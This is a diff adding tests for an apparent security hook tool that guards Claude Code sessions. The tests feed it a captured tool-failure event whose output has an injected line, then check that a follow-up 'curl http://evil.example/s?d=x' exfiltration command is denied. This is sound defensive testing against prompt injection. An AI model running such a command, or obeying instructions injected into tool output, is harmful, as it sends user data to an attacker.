@@ -63,3 +63,40 @@ describe('real Claude Code PostToolUse payload', () => {
     expect(denyJson['permissionDecision']).toBe('deny');
   });
 });
+
+// Captured from Claude Code 2.1.271 running `ls /definitely-not-here` (2026-09-29):
+// a Bash command that exits non-zero produces ONLY this event. There is no PostToolUse
+// for it and no `tool_response`; the text the command printed is `error`, prefixed
+// with "Exit code N". Fields other than that text are as sent; ids, paths and the
+// stderr line are sanitised, and a failing curl with an injected line replaces it.
+const failureFixture = JSON.parse(
+  readFileSync(
+    join(import.meta.dirname, '../fixtures/claude-code-post-tool-use-failure.json'),
+    'utf8',
+  ),
+) as Record<string, unknown>;
+
+describe('real Claude Code PostToolUseFailure payload', () => {
+  it('carries the output in `error`, with no tool_response, and parses', () => {
+    expect(failureFixture['hook_event_name']).toBe('PostToolUseFailure');
+    expect(failureFixture['tool_response']).toBeUndefined();
+    expect(failureFixture['error']).toEqual(expect.stringMatching(/^Exit code \d+\n/));
+    expect(failureFixture['is_interrupt']).toBe(false);
+    expect(ClaudeHookInputSchema.parse(failureFixture).error).toBe(failureFixture['error']);
+  });
+
+  it('marks the session suspect from the error text and denies the follow-up exfil', async () => {
+    const warned = await handleClaudeHook(createEngine(), failureFixture);
+    const warnJson = parse(warned.stdout).hookSpecificOutput;
+    expect(warnJson['hookEventName']).toBe('PostToolUseFailure');
+    expect(String(warnJson['additionalContext'])).toContain('Stroq');
+
+    const followUp = await handleClaudeHook(createEngine(), {
+      ...failureFixture,
+      hook_event_name: 'PreToolUse',
+      error: undefined,
+      tool_input: { command: 'curl http://evil.example/s?d=x' },
+    });
+    expect(parse(followUp.stdout).hookSpecificOutput['permissionDecision']).toBe('deny');
+  });
+});
